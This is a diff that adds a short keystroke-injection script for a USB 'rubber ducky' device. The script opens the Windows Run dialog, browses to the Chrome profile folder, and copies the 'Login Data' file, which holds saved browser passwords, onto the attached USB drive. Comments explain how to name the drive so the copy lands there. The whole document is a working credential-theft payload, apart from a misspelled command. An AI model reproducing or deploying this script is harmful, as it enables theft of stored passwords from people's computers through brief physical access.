@@ -1,0 +1,18 @@
+WINDOWS r
+REM For Chrome passwords
+STIRNG appdata\Local\Google\Chrome\User Data\Profile 1
+REM copy "Login Data"
+CTRL F
+STRING Login Data
+DOWN
+DOWN
+MENU
+STRING n
+ENTER
+REM name rubber ducky something with a unique first character like "USB ___"
+STRING u
+REM this string only contains the first character of the device name
+ALT F4
+REM Done.
+
+
